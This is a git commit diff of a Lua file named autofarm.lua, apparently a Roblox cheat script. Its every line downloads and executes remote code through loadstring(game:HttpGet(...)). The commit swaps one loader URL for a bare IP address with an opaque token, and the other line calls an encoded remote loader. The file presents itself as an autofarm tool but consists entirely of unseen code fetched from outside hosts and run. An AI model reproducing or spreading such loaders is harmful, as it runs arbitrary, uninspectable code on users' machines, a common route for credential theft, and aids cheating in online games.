5c44238dbc0e50a8df6e223cb21fb02b17025bba
createdreallol <116285995+createdreallol@users.noreply.github.com>
2026-05-17 14:04:58 -0400

    Update autofarm.lua

--- autofarm.lua
+++ autofarm.lua
@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjM4MTM3ODUzLTFhZmEtNDFjZC1hNjQ0LTVmNWM1YjcwOWI2MSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
-loadstring(game:HttpGet("http://d20.aurorix.net:25318/NLiya241t7AzAr7gdAL0NWiPTrmVLRNIpNE7IKGGZTbPUThmJzxazUBB8lmlDbarBGEiCfBLIKTNYJfU"))()
+loadstring(game:HttpGet("http://84.200.89.110/SA4XEYTgr1LYIHcGKik3OsxylFMtklNIWPpKcj4PcnppENwYSGTh9G9B2CDK3COwym1Z2eXOqfNMBEp3"))()
